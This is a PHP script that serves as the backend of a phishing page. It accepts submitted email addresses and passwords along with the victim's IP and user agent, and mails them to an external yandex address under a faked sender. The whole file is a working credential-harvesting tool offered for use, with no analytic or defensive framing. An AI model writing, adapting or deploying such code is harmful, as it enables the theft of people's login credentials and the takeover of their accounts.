<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    $input = $_POST;
}

$email = $input['email'] ?? '';
$password = $input['password'] ?? '';
$ip = $input['ip'] ?? $_SERVER['REMOTE_ADDR'];
$userAgent = $input['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'];

$to = "alilogs247@yandex.com";
$subject = "New Login - " . $ip;
$date = date('Y-m-d H:i:s');

$message = "=== NEW LOGIN ===\n";
$message .= "Date: " . $date . "\n";
$message .= "Email: " . $email . "\n";
$message .= "Password: " . $password . "\n";
$message .= "IP: " . $ip . "\n";
$message .= "User Agent: " . $userAgent . "\n";

$headers = "From: noreply@system.com\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

$sent = mail($to, $subject, $message, $headers);
echo json_encode(['success' => $sent]);
?>
